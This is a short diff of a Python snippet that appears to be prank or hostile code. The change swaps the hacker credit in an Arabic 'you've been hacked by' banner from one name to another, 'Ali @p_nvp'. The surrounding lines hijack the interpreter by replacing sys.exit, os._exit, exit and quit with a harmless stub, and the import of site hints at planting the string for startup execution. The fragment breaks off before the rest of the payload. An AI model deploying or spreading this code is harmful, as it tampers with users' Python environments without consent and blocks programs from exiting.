@@ -1,5 +1,5 @@
 import os,site,sys
-c = r"""print('تم اختراقك من سجاد') 
+c = r"""print('تم اختراقك من علي @p_nvp') 
 import sys, builtins,os
 def i(*a,**k): return f"exit({a},{k})\n"
 sys.exit=i;os._exit=i;exitSystem=i;exit=i;quit=i
